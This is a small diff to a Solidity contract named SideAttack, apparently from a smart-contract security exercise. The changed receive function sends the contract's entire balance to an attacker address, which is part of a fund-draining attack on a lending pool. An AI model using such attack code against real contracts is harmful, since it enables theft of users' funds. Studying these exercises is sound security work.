@@ -27,6 +27,6 @@ contract SideAttack  {
         pool.deposit{value: msg.value}();
    }
    receive() external payable {
-        payable(attacker).send(address(this).balance);
+        payable(attacker).transfer(address(this).balance);
    }
 }
